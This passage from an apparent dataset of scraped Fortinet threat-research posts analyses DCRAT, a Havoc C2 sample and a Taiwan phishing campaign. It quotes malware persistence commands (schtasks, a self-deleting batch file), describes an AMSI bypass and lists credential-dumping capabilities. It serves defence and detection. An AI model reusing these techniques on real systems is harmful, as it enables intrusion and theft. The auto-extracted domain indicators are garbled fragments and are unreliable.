e3c080e322862d065649c468d20f620c3670d841c30c3fe5385e37f4f10172e7e62df17150fcb7fea32ff459ef47cdd452a21269efe9252bde70377fd2717c1053e2c2d83813d1284ddb8c68b1572b17cca95cfc36a55a7517bf45ff40828be543d4847bf237c445ed2e846a106e1f55abefef5c3a8545bd5e4cad20f5deb9a44c2429fc8b8ec61da41cbba1b8184ec45fa93a9841b4ca48094bba7741b826b8694d729d67f1b0c06702490bfab1df3a96fe040fe5d07efa5c92356c329757beedae3b75deb8013bd48ac4534cca345b90938a2abb91672467c2bf9ae81ff6830814a0781ab30fca069a085dba201d6fd0f414498fafa4bb42859786d91d478159b4deee977e9e27b60e7e179d54a1ce8e56624e73b799523416eee828bfaf769f916a552efc6775367a31357a633dc0be01879830d3fddccdf3c40b26e50afd0a9ebbecc8ec58c253039520304ca373cfb8d1674d67993e6485e244a77d6ec96c81fd73b4bef6fef379cbefdcce7f374ea7e6bf1bf0917cf4ca7b72d4cee788a55a3859a203ca2bae7399295f92aeae61d845ffa173c1938f938f5c148eef9957573779f9a62eecb80737d41d42165af8bb9884579c50736766abb63d2835ba3daa53204978b7797bd53f5c964eed7a73d971517a764785ce3ab65a9423c2e78bf8928bc255e73e0b5b0ce13747c64d82d5f2647da129f189138773733ac21f20a24b179bdbbdcc0053838c0484ea25eff6976f2b8cb5630ab4efb28b0f06b542aa715573c7d2fca01914504cb7336db715d73d1e20d23e4bd37f2e4f4fe389c9278ce988343606350a94156ca28ee28bd605d1d95c810a16866eee1f997598a197f60d5f5641f2c56576b4c867d141612c6e00db29c512f266835510b8a62d8250d289c5ec87752cec1af31eed0347cf2dd54dc0fbeea645319c4dae238ee2d02414a54e97ad26748812002610f1491a2a746e9ba0f9d05de3d47d7bab4f5ec123a91fdacd9a4c0bcf800d6b7db5162cfd11cb71e260647ef0f2c60978ebfcef708fec1afbea4fb32b586e0dacf0d228c375a532008d81453c367256afea5a305507f34c14c72cab35715b7f7b25b32352a8e19b8a283003aaf539d12ca517937e6ab0dfcedfa23eced7b52d3899b0847df3fcb7a9c326b71027a7ab5f5b93 botnets,botnet FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/rondobox-unveiled-breaking-down-a-botnet-threat",
      "scraped_at": "2025-07-20T13:40:49.073974",
      "indicators": {
        "ip_address": [],
        "domain": [
          "ontact",
          "r",
          "pply",
          "evice"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [
          "CVE-2024-3721",
          "CVE-2024-12856"
        ],
        "email": [],
        "url": []
      },
      "threat_score": 0.46591889559965494
    }
  },
  {
    "id": "Fortinet_82261",
    "source": "Fortinet",
    "title": "DCRAT Impersonating the Colombian Government",
    "text": "FortiGuard Labs Threat Research Multi-layered obfuscation used to deploy remote access trojan Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Control and collect victim’s sensitive information from the victim’s devicePrevalence:Columbia targetedSeverity Level:High The FortiMail IR team recently uncovered a new email attack distributing a Remote Access Trojan called DCRAT. The threat actor is impersonating a Colombian government entity to target organizations in Colombia. The threat actor uses multiple techniques, such as a password protected archive, obfuscation, steganography, base64 encoding, and multiple file drops, to evade detection. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. 1. Modular ArchitectureDCRAT is designed with a modular structure, allowing attackers to add or remove plugins. This lets them tailor the RAT’s behavior to specific tasks like data theft, surveillance, or persistence. 2. Comprehensive Surveillance CapabilitiesThe RAT allows remote control over infected systems. Attackers can execute commands, manage files, monitor user activity, and even download or run additional malicious payloads. 3. Information TheftIt can steal sensitive information such as credentials, documents, browser data, and personal files. It also supports screenshot capture and keylogging to record user input. 4. System ManipulationDCRAT can alter system settings — rebooting, shutting down, logging off users, or creating new accounts. It can also change visual elements like wallpapers and taskbar visibility. 5. File and Process ManagementThe malware supports creating, deleting, renaming, or moving files and folders. It can run or terminate processes and upload/download files to or from the victim’s system. 6. Browser and Credential HarvestingIt specifically targets browsers to extract stored data such as cookies, browsing history, and saved login credentials. It can also open websites and perform actions in the user’s browser. The threat actor sends an email impersonating a Colombian government entity to trick the user to run the attachment contents while having the recipient in the BCC field: The ZIP attachment contains a bat file which will drop an obfuscated vbs file from a pastebin like website to C:\\Windows\\Temp: The vbs file is heavily obfuscated and is made to trick analysts and systems: After removing the junk and the obfuscation, we found the following, which eventually runs the base64 variable: The base64 code in the first variable contained another script: Cleaning the above script reveals the following: This script sets a reversed URL as a variable and points it to an image which contains data hidden with base64. Unfortunately, the URL can’t be reversed and the image payload is no longer available. But due to the presence of the URL, which contains an exe file in base64 and the contents of the code itself, it is safe to assume it would extract the image data and invoke a . NET library to download thethird and final payload from the reversed URL to C:\\Users\\Public\\Downloads: The base64 string in the reversed URL contains the RAT exe file. Looking at the main function, we see multiple calls: It starts with a small delay, and then goes into InitializeSettings, which will decrypt settings encrypted with AES256. The AES256 key is hardcoded and is in base 64: Variables revealed after the decryption: Ports– 8848Hosts- 176.]65.]144.]19Version– 1.0.7Install– falseMTX– DcRatMutex_qwqdanchunPastebin– nullAnti– falseAnti_Process– falseBS_OD– falseGroup– AUHWID– This takes the properties of the machine, concatenates them, converts that into an MD5 hash, and then converts that hash into a hexadecimal string. It then takes the first 20 characters and converts them into upper case. Server signature – iHIVV6dj49xn32TizMB3V5F6bAZIlmMWQuHKEN0CBcWc9Ig0HTq78LVe/AKhThRcQR7wOt/8i61T7NkoN+CPhQ8311QUiU2j4NTTO3B/f3ifVSB2vTGJgrF19iqrqUwK8NKkJnHR+29/ec7pz4lMhwJSOhYYj0ZB9BtUYMUzsic= Server certificate - MIICMDCCAZmgAwIBAgIVAJdJTOcvv+RE0UKkRJdxy6sUSIJ9MA0GCSqGSIb3DQEBDQUAMGQxFTATBgNVBAMMDERjUmF0IFNlcnZlcjETMBEGA1UECwwKcXdxZGFuY2h1bjEcMBoGA1UECgwTRGNSYXQgQnkgcXdxZGFuY2h1bjELMAkGA1UEBwwCU0gxCzAJBgNVBAYTAkNOMB4XDTI0MDYyNjE0MzcyN1oXDTM1MDQwNTE0MzcyN1owEDEOMAwGA1UEAwwFRGNSYXQwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAKBWZ41Q3CUr6D9fGM31TTe3ObXCDtWIxyuls5ZxROJrzVNlVm5Mb2zSE/543JczTUE94b3YzFPMUMJJ3SB7vpO7L4lMe0W+JlZClj/00M3J6b7a4bB4/c/BVrO3O5RMGNlMSCy68zX8roxt0SFUdlB2L6JJ2xEuaVv/9bdejAK7AgMBAAGjMjAwMB0GA1UdDgQWBBSKoz4PgqFtf1/VImq3jWW0Pxsu5zAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBDQUAA4GBAIrcEfDtCf8noEqBq9iAkPXXTNhGZ3YgwxGfvgWCAGSrWcEdOs2tWJ4Vx1EgAy6SZ6tJq6soFYOJohwV4S22WVnoQzzPgB759pR36AP0zFjxEhhci0wTHQuP8wRW8oTOCsQxjjHrFFBCqHLTq4Wc59cWbLwuTSBSTgqM0u1iOvO9 After initializing those settings, it runs VerifyHash, which checks if the signature is valid for that hash and public key. Following the main function, if Anti had been TRUE, it would run the following anti analysis function: This runs a query that selects everything from Win32_CacheMemory and iterates through each one. Win32_CacheMemory provides info about cache memory devices. If there are none, it could indicate the presence of a VM. Following the next call, it creates a mutex with the mutex name previously decrypted and saved into MTX. (DcRatMutex_qwqdanchun) If the Anti Process were true, it would run a code that would constantly check for the processes mentioned in it and terminate them if detected: After the next call, if BS_OD (i.e., Blue Screen of Death) was set to true and the user had administrative privileges, the code would attempt to mark the malware process as a critical system process using RtlSetProcessIsCritical. Terminating such a process would trigger a blue screen of death. Following the next call, if In_stall were true, it would run through a few blocks of code under Install(). This code block uses FileInfo to retrieve properties of the Install_Folder variable, which in this case points to the AppData\\Roaming directory. It then obtains the full file path of the currently running malware and compares it to the Install_Folder path. If the paths do not match, it iterates through all running processes and terminates any that are executing from the Install_Folder location. If the user has administrative privileges, the malware spawns a hidden cmd process to execute a base64-decoded command string: /c schtasks /create /f /sc onlogon /rl highest /tn It then appends parameters to register the malware binary as a scheduled task for persistence. The final command executed is: /c schtasks /create /f /sc onlogon /rl highest /tn \"TASK NAME\" /tr \"\\\"FULL PATH OF THE EXECUTABLE\\\"\" & exit If the user lacks administrative privileges, the malware instead creates a registry entry under: HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ The entry uses the malware’s filename and path to ensure it is executed at user logon. After completing the previous steps, the malware checks whether the file still exists at the path specified by FullName (i.e., the full path of the currently running executable) and pauses execution for one second. It then creates a new file in the AppData\\Roaming directory and copies the current executable into that location. Next, it generates a .bat file in the AppData\\Local\\Temp directory containing a script designed to execute the dropped file and then delete itself. The contents of the batch file are as follows: @echo offtimeout 3 > NULSTART \"\" \"DROPPED FILE LOCATION\"CD xxx\\AppData\\Local\\Temp\\DEL \"BAT FILE NAME\" /he flags: This function instructs Windows to keep the display on and prevent the system from entering sleep mode, maintaining this state continuously until explicitly reset. It uses the value 2147483651U, which corresponds to 0x80000003 in hexadecimal. According to Microsoft’s documentation for SetThreadExecutionState (a function imported from kernel32.dll), this value is a combination of the following flags: Combined, these flags ensure that the system remains active and the screen remains on without interruption. The RAT then checks to see if the user is an admin. If so, it runs the CleanSetting function: This function performs the following: The RAT then calls for the Amsi. Bypass function The function receives two base64-encoded strings and determines whether the current process is running in 32-bit or 64-bit mode. It then passes this architecture-specific value as a byte to the PatchA function. Inside PatchA, the function decodes two base64 strings: \"amsi.dll\" and \"AmsiScanBuffer\". AmsiScanBuffer is a function provided by the Windows Antimalware Scan Interface (AMSI), available in Windows 10 and later. AMSI allows applications to pass memory buffers to the system’s antivirus engine for scanning. The function proceeds to load amsi.dll into memory and retrieves the address of the AmsiScanBuffer function. It then attempts to inject a patch into this memory location, with the goal of sabotaging or disabling AMSI’s ability to detect malicious code. Finally, the RAT enters an infinite loop, continuously attempting to connect to its command-and-control (C2) server. In this case, the C2 address was hardcoded, as noted earlier. However, the RAT also supports retrieving the C2 address dynamically from a remote URL stored in the Paste_bin variable. The attacker sends a phishing email impersonating a Colombian government agency to deceive the user into executing a malicious file. To evade detection, the attack chain employs multiple obfuscation techniques, including steganography and multi-stage payloads. When the file is run, it downloads an obfuscated VBS script from a text-sharing site. This script, in turn, executes obfuscated PowerShell code that retrieves a second link from another sharing site. It then extracts and invokes a . NET library embedded within an image file using steganography to deliver and execute the final payload. The impact of such an attack is severe: giving a threat actor direct access to a victim’s machine can result in the theft of sensitive data, system compromise, and significant operational or financial damage. FortiMail dynamically detects the email, the BAT file, and the VBS file as malware. FortMail also detects the files statically based on the system’s advanced threat engines and previous threat intelligence research. The malware described in this report is detected and blocked byFortiGuard Antivirusas: MSIL/Agent. CFQ!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. The FortiGuard CDR (Content Disarm and Reconstruction) service, which runs on both FortiGate and FortiMail, can disarm the malicious macros in the document. We also suggest that organizations go through Fortinet’s freeNSE trainingmodule:FCF Fortinet Certified Fundamentals. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP ReputationandAnti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. hxxp[:]//paste[.]ee/d/jYHEqBJ3/0hxxps[:]//paste[.]ee/d/oAqRiS3ghxxps[:]//ia601205[.]us[.]archive[.]org/26/items/new_image_20250430/new_image[.]jpg ZIP:db21cc64fb7a7ed9075c96600b7e7e7007a0df7cb837189c6551010a6f828590BAT:34b8040d3dad4bd9f34738fbc3363fcda819ac479db8497fb857865cee77ad89VBS:b0f3c7ea17875b5e1545678b3878ce268ff4bde718b66254ce01b0bb864801b8EXE:77a22e30e4cc900379fd4b04c707d2dfd174858c8e1ee3f1cbecd4ece1fab3feC2:176[.]65[.]144[.]19[:]8848 FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/dcrat-impersonating-the-columbian-government",
      "scraped_at": "2025-07-20T13:40:56.527766",
      "indicators": {
        "ip_address": [],
        "domain": [
          "msi",
          "ernel32"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.215119852489244
    }
  },
  {
    "id": "Fortinet_30957",
    "source": "Fortinet",
    "title": "Dissecting a Malicious Havoc Sample",
    "text": "FortiGuard Labs Threat Research A Follow-Up to “Intrusion into Middle East Critical National Infrastructure Affected platforms:Microsoft WindowsImpacted parties:Windows UsersImpact:Fully remotely control the compromised computerSeverity level:High This analysis is a follow-up to the investigation titled ‘Intrusion into Middle East Critical National Infrastructure’(full reporthere), led by the FortiGuard Incident Response Team (FGIR), which investigated a long-term cyber intrusion targeting critical national infrastructure (CNI) in the Middle East. That report revealed that the attacker added several pieces of malware to the system’s Task Scheduler to maintain persistence. In this report, we conduct a detailed analysis of one of the malicious Havoc variant samples. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. Havoc is a well-known post-exploitation command and control (C2) backdoor framework, primarily written in C++ and Go. We describe how this Havoc variant is decrypted from a DLL file and then deployed in a newly created “cmd.exe” process, how the Havoc demon communicates with its C2 server, and what malicious actions it can perform on the compromised Windows system. The remote injector (conhost.exe) is launched by the system Task Scheduler using the following command line. C:\\Windows\\System32\\drivers\\conhost.exe -f conhost.dll -ER --ln --path cmd.exe Since the release of Windows 7, Windows OS has included conhost.exe (Console Window Host) to handle the command-line interface. The attacker disguised the remote injector as conhost.exe to mislead the victim. According to our analysis, the remote injector supports multiple features controlled by command-line parameters. The “conhost.dll” passed with the “-f” parameter contains the encrypted Havoc payload, and the “cmd.exe” specified by the “--path” parameter is the target process, into which Havoc will be injected and executed. When the fake conhost.exe is executed without any parameters, it displays its help information (Figure 1), which explains how to use the remote injector and its available options. Once the remote injector starts, it creates a “cmd.exe” process, specified by the “-- path” argument, by calling the API CreateProcessA(), as shown in Figure 2. The remote injector then decrypts a Havoc payload, referred to as the Havoc agent or demon within the Havoc framework, using a piece of shellcode embedded in the conhost.dll file. Figure 3 shows the decryption function in the remote injector, a portion of the decrypted shellcode, and the decrypted Havoc payload in the memory at the bottom of the debugger. The decryption key and IV are generated from the first 30H bytes of the conhost.dll file. Next, the remote injector calls two APIs, ZwAllocateVirtualMemory() and ZwWriteVirtualMemory(), using the ProcessHandle of the newly created “cmd.exe” process to inject the decrypted shellcode and Havoc executable into the process. Finally, the remote injector creates a remote thread by calling the ZwCreateThreadEx() API. The ProcessHandle parameter is again set to the newly created “cmd.exe” process, and its lpStartAddress parameter points to the address of the injected shellcode within the process. The purpose of shellcode is to deploy the subsequent Havoc payload (a DLL file) into the “cmd.exe” process and execute it. Havoc Framework is a typical RAT (Remote Access Trojan) and an open-source project available on GitHub. The Framework is written in multiple languages, including Golang, C, C++, Qt, Python, and Assembly (ASM). It was developed byC5piderand released in 2022. In Havoc, the Command and Control (C2) server is referred to as teamserver, while its UI dashboard, used to interact with teamserver, is referred to as the client. The Havoc agent, also known as a demon, runs on the compromised device to receive commands from the C2 server, allowing it to control the system. Figure 4 shows the Havoc client on the server side, where a demon is actively being connected and controlled. Havoc supports HTTP, HTTPS, and SMB protocols to transport commands and results between the C2 server and the compromised devices. In this sample, the C2 server is hardcoded as “apps[.]gist[.]githubapp[.]net.” Unfortunately, the server was unavailable during our analysis. To proceed with our analysis, we set up a simulated Command and Control (C2) server. We modified the protocol from HTTPS to HTTP, allowing the traffic to be captured and analyzed in plaintext without TLS encryption. As long as the Havoc demon is running on the compromised device, it collects metadata about both the compromised Windows system and the Havoc process itself. This metadata is encrypted using the AES algorithm and then sent to the C2 server to register the compromised system on the C2 server. As shown at the bottom of Figure 5, the collected metadata includes various system and process details. The metadata (size:0xBA) contains, but is not limited to, the following information: the agent ID (0x67C54600), Demon ID (0x0F), Host name, User name, Doman, IP address, process name (“C:\\Windows\\SYSTEM32\\cmd.exe”), process ID (0x1ED4), parent PID (0x2444), the process’s load base address, OS version information, OS architecture, and more. Figure 6 shows a demon-init packet containing the AES-encrypted metadata mentioned earlier. This packet must be sent as the first packet to the C2 server to register the victim’s system. We have divided the packet into color-coded sections and broken it down in the table below to explain the contents of each part. The data size, 0xFA. Magic value, 0xDEADBEEF. Agent ID, 0x67C54600. Command ID, 0x63. DEMON_INIT. Request ID, 0x0. AES Key, 20h bytes. AES IV, 10h bytes. The AES encrypted metadata. The demon-init packet is sent as the body of an HTTP POST request. When the C2 server receives the packet, it verifies the magic value and decrypts the metadata using the AES key and AES IV included in the packet to complete the registration process. Meanwhile, the demon appears on the client dashboard with the compromised system metadata, just as illustrated in Figure 4. Figure 7 shows a Wireshark screenshot capturing a demon-init packet sent via an HTTP Post request. Havoc defines a wide range of control commands to control the compromised system, listed below: COMMAND_GET_JOB(0x1) COMMAND_INLINEEXECUTE_EXCEPTION(0x1) COMMAND_INLINEEXECUTE_SYMBOL_NOT_FOUND(0x2) COMMAND_INLINEEXECUTE_RAN_OK(0x3) COMMAND_INLINEEXECUTE_COULD_NO_RUN(0x4) COMMAND_INLINEEXECUTE(0x14) COMMAND_NOJOB(0xA) COMMAND_SLEEP(0xB) COMMAND_PROC_LIST(0xC) COMMAND_FS(0xF) COMMAND_JOB(0x15) COMMAND_INJECT_DLL(0x16) COMMAND_INJECT_SHELLCODE(0x18) COMMAND_SPAWNDLL(0x1A) COMMAND_PROC_PPIDSPOOF(0x1B) CALLBACK_OUTPUT(0x0) CALLBACK_FILE(0x2) CALLBACK_FILE_WRITE(0x8) CALLBACK_FILE_CLOSE(0x9) CALLBACK_ERROR(0xD) CALLBACK_OUTPUT_OEM(0x1E) CALLBACK_OUTPUT_UTF8(0x20) DEMON_INIT(0x63) DEMON_INFO(0x59) BEACON_OUTPUT(0x5E) COMMAND_TOKEN(0x28) COMMAND_OUTPUT(0x5A) COMMAND_ERROR(0x5B) COMMAND_EXIT(0x5C) COMMAND_KILL_DATE(0x5D) COMMAND_CHECKIN(0x64) COMMAND_EXCEPTION(0x98) COMMAND_SYMBOL_NOT_FOUND(0x99) COMMAND_NET(0x834) COMMAND_CONFIG(0x9C4) COMMAND_SCREENSHOT(0x9CE) COMMAND_PIVOT(0x9D8) COMMAND_TRANSFER(0x9E2) COMMAND_SOCKET(0x9EC) COMMAND_KERBEROS(0x9F6) COMMAND_MEM_FILE(0xA00) COMMAND_PACKAGE_DROPPED(0xA0A) COMMAND_PROC(0x1010) COMMAND_PS_IMPORT(0x1011) COMMAND_ASSEMBLY_INLINE_EXECUTE(0x2001) COMMAND_ASSEMBLY_LIST_VERSIONS(0x2003) Most of the commands come with sub-commands to extend their capabilities. For example, theCOMMAND_FS(0xF)has 10 sub-commands: DEMON_COMMAND_FS_DIR(1) DEMON_COMMAND_FS_DOWNLOAD(2) DEMON_COMMAND_FS_UPLOAD(3) DEMON_COMMAND_FS_CD(4) DEMON_COMMAND_FS_REMOVE(5) DEMON_COMMAND_FS_MKDIR(6) DEMON_COMMAND_FS_COPY(7) DEMON_COMMAND_FS_MOVE(8) DEMON_COMMAND_FS_GET_PWD(9) DEMON_COMMAND_FS_CAT(10) Suppose the attacker needs to create a folder named “test” on the compromised system. The packet shown in Figure 8 can be observed: 0x0F is the command ID for DEMON_COMMAND_FS, and 0xA18D02EC is the request ID. The following value indicates the size of the encrypted sub-command and parameters. Within the decrypted sub-command data, 0x06 is the ID for DEMON_COMMAND_FS_MKDIR, and the subsequent data represents the folder name (size + data). In addition to the command and subcommand approach, Havoc also supports the in-memory execution of object files, commonly known as BOFs (Beacon Object Files). The C2 server sends a compiled Object File containing a piece of binary shellcode, which is executed directly in the memory of the demon process on the compromised system. Using BOFs allows Havoc to extend its functionality without replacing or updating the demon itself. Figure 8 shows a recently decrypted object file carried in a packet for the COMMAND_MEM_FILE command (command ID: 0xA00). The packet was sent when we typed “enum_filter_driver” in the client UI. In addition to the control commands, sub-commands, and BOFs introduced earlier, Havoc also implements a wide range of features. These features are categorized into two types: command and module, with each module containing multiple commands. Once we type a command name or a module name followed by its command name, the C2 server generates a command packet with the corresponding command ID and sub-command ID or BOF, which is then sent to the demon to control the compromised system. All the features of Havoc are listed in the table below. Command Name Description Enumerate CAs and templates in the AD. adcs_request Request an enrollment certificate. Add a new user to a machine. addusertogroup Add a user to the specified group. Lists out ARP table. A Seatbelt port using BOFs (Beacon Object Files). List user permissions for the specified file. Display content of the specified file. Change to a specified directory. Request a checkin request. Configure the behavior of the demon session. Enumerate domain information. List directory. DLL spawn and injection modules. Lists users accounts in the current domain. Execute and manage dotnet assemblies. Downloads a specified file. Checks drivers for known EDR vendor names. Activates the specified user account. enum_filter_driver Enumerate filter drivers. enumlocalsessions Enumerate currently attached user sessions. Print environment variables. Cleanup and exit. Enumerate a given domain for user accounts with ASREP. get-delegation Enumerate a given domain for different types of abusable Kerberos Delegation settings. get-netsession Enumerate sessions on the remote device. Enumerate a given domain for user accounts with SPNs. get_password_policy Gets a server's configured password policy. Shows help message of specified command. inline-execute Executes an object file. Display network configuration settings . Job manager. Lateral movement module. Perform Kerberoasting against specified SPN. List Kerberos tickets. Execute LDAP searches. Obtains DNS cache entries. Prints the locale information of the server. Get current logon ID. Create new directory. Move a file or folder. Dump the LSASS process. nanodump_ppl_dump Bypass PPL and dump LSASS. nanodump_ppl_medic Bypass PPL and dump LSASS. nanodump_ssp Load a Security Support Provider (SSP) into LSASS. Network and host enumeration module. netGroupList List groups. netGroupListMembers List group members. netLclGrpLstMmbrs List local group members. netLocalGroupList List local group. List shared folders. netsharesAdmin List details of the shared folders. List listening and connected network connections. Obtains the boot time information. Get information about specific user. Lists the workstations and servers. noconsolation Execute a PE inline. Make a DNS query on the compromised device . Pivoting module. Executes unmanaged powershell commands. Executes powershell.exe commands. Process enumeration and management. Import Kerberos ticket into a logon session. Purge a Kerberos ticket. Get current directory. Simple implementation of quser.exe. Deletes the registry key or value. Query a registry value or enumerate a single key. reg_query_recursive Recursively enumerate a key. Saves the registry path and all subkeys to a file. Creates or sets the specified key or value. Remove file or directory. List information of memory and disk drive. Prints route information. Reverse port forwarding. Dumps the SAM, SECURITY and SYSTEM registries to files. Creates a service on the target device. Deletes the specified service. sc_description Sets the description of an existing service. Enumerate services. Queries a service with name in BOF (Beacon Object Files). sc_qdescription Queries a services description sc_qfailure Query a service for failure conditions. sc_qtriggerinfo Query a service for trigger conditions. Query services in BOF (Beacon Object Files). Starts a specified service. Stops a specified service. schtasksenum Enumerate scheduled tasks. schtasksquery Query the given task in scheduled tasks. Takes a screenshot. Get logon sessions. setuserpass Sets the password to a specified user account. Executes Windows commands in cmd.exe. Shellcode injection techniques. Sets the delay to sleep. Manages socks5 proxy. Task manager. List running processes on the remote device. Retrieve a usable TGT for the current user. Token manipulation and impersonation. Download transfer module. Uploads a file. Lists system boot time. Lists user accounts. Get the login user information in BOF (Beacon Object Files). List visible windows, like program windows’ title. Run a wmi query and display results in CSV format. Here is how a control command is packaged into a packet. Acting as an attacker, we entered the “pwd” command inside the Havoc C2 server and sent it to the demon, which then displayed the command result on our screen. Typically, once the demon has connected to the C2 server, it sends a heartbeat packet to the C2 server approximately every 3 seconds (a random number) to notify the C2 server that the demon is still alive. The heartbeat packet structure is shown in Figure 10. Figure 10 also shows the command packet for the “pwd” command generated by the C2 server at the bottom. The control command data is sent within the response to the heartbeat packet. The command packet begins with a command ID (0x0F for COMMAND_FS), followed by a request ID (0xc5312b04), the size of the encrypted data, and then the encrypted data itself. The encrypted data, “51 7c 66 9c,” decrypts to “00 00 00 09,” which is the sub-command ID 0x9 (for DEMON_COMMAND_FS_GET_PWD) under the command ID 0x0F (COMMAND_FS). This analysis provides a detailed examination of a Havoc variant involved in a long-term cyber intrusion targeting critical national infrastructure in the Middle East. It demonstrates how this remote injector leverages a disguised conhost.exe process to deploy the Havoc payload into a newly created cmd.exe process. The Havoc framework’s modular design, supporting commands, sub-commands, and in-memory execution of Beacon Object Files (BOFs), offers attackers a flexible method to control the remote demon process. Overall, understanding the packet structures, encryption mechanisms, and command execution workflows will help researchers detect and analyze this sophisticated RAT framework. Fortinet customers are already protected from this malware with AntiVirus service, FortiGuard’s Anti-Botnet service, FortiGuard’s AntiSPAM service, and FortiGuard’s Web Filtering service as follows: TheFortiGuard’s Anti-Botnet serviceblocks the DNS requests for the C2 server domain. The domain to the C2 server is rated as “Malicious Websites” by theFortiGuard Web Filtering service. FortiGuard Antivirus servicedetects the remote injector and the encrypted Havoc DLL file with the following AV signatures. W64/Havoc.d16b!trData/Havoc.e5b0!tr FortiGuard IPS servicedetects Havoc traffic with the signature “Backdoor. Havoc. Agent”. FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each solution. As a result, customers who have these products with up-to-date protections are already protected. We also suggest that our readers go through the freeNSE training:NSE 1 – Information Security Awareness, a module on Internet threats designed to help end-users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. apps[.]gist[.]githubapp[.]net [conhost.exe / the remote injector]22BD09FBAB54963D4B0234585D33571A47A2DF569DBAB8B40988415AB0A3C37B[conhost.dll / encrypted Havoc sample with shellcode]9208034AF160357C99B45564FF54570B1510BAF3BC033999AE4281482617FF5B FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/dissecting-a-malicious-havoc-sample",
      "scraped_at": "2025-07-20T13:41:04.123938",
      "indicators": {
        "ip_address": [],
        "domain": [
          "md",
          "onhost",
          "owershell",
          "user"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "22BD09FBAB54963D4B0234585D33571A47A2DF569DBAB8B40988415AB0A3C37B",
          "9208034AF160357C99B45564FF54570B1510BAF3BC033999AE4281482617FF5B"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.13118916631400762
    }
  },
  {
    "id": "Fortinet_91224",
    "source": "Fortinet",
    "title": "Threat Group Targets Companies in Taiwan",
    "text": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attacksSeverity Level:High In January 2025, FortiGuard Labs observed an attack targeting users in Taiwan. The threat actor is spreading the malware known as winos 4.0 via an email masquerading as being from Taiwan's National Taxation Bureau. Through continued monitoring, we identified further malware samples associated with this campaign. Among the new samples, a phishing email was sent in March 2025 with an attachment that contained a link used in another attack campaign. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The first link belongs to the domain twszz[.]xin, which follows a similar naming pattern to the campaign targeting users in Taiwan. The second link directs to an image file about tax inspection, while the HTML filename claims to include account statement details. This link enabled us to trace the attack and identify additional malware samples, along with further links. Figure 2 provides a simplified threat map. The files on the left side of Figure 2 are XLS files used in campaigns that took place in June 2024. Over the past few months, this threat group has deployed malware based on the HoldingHands RAT (Remote Access Trojan), also known as Gh0stBins, to compromise users in Taiwan. The malware typically comprises multiple files embedded within a ZIP file and is distributed via phishing emails. Phishing emails typically masquerade as messages from the government or business partners, using topics such as taxes, pensions, invoices, and other subjects that prompt the recipient to immediately click on or open an attachment. Sometimes, the email content can be a picture with a hyperlink that asks the recipient to click on it, inadvertently downloading the malware. The attached PDF file uses content related to the phishing email to trick the recipient into opening the link. In newer attack chains, the link leads to a download page. The malware download page looks much simpler than the PDF file and email. It only contains text and a download button. In some attack chains, the malware is embedded in a password-protected ZIP file, and the password is on the download page. This prevents analysts who get the ZIP file but don't have access to the download page from opening it. Multiple files are used during the attack, including legitimate executable files and necessary DLL files, encrypted shellcode, and shellcode loaders. The shellcode loaders, which decrypt and execute the encrypted shellcode, are DLL files loaded by a legitimate executable via side-loading. Figure 8 shows an example of the files embedded in the ZIP file and the execution flow.條例檔案is the legitimate executable file used to loaddokan2.dllvia side-loading. In addition to the main execution flow, encrypted shellcodes support persistence, and empty files provide unique filenames. Although the ZIP files downloaded from different PDF files and webpages may have varying folder structures and files, their execution flows are similar to those shown in Figure 8. Sometimes, the ZIP file only contains an executable that drops the duplicate files observed in other chains. According to the image debug directory of the executable file, the malware is based on the HoldingHands Remote Access Trojan (RAT). Over the past two months, the ZIP file has included a text file containing the passwords for other files in the ZIP file, which makes detection more difficult. Dokan2.dll creates a thread to decrypt data indxpi.txtand execute it. Before this, it calls theShowWindowfunction to hide the executable's window for side-loading. It then searches forkernel32.dllandDwhsOqnbdrr.dllby comparing the lengths of the filenames of the files extracted from the ZIP file. DwhsOqnbdrr.dllis an empty file. By shifting each letter in the filename “DwhsOqnbdrr”forward one position in the alphabet, it becomesExitProcessand loads the function from thekernel32.dllit just found. It replaces the address of theExitProcessfunction in the import table with the address of a function that calls theWaitForSingleObjectfunction to wait for a signal from the thread that decryptsdxpi.txt. When the thread finishes, it calls theExitProcessfunction that it just loaded. In the thread, it executesthe條例檔案as an administrator if it doesn’t have high enough privileges. Then it searches 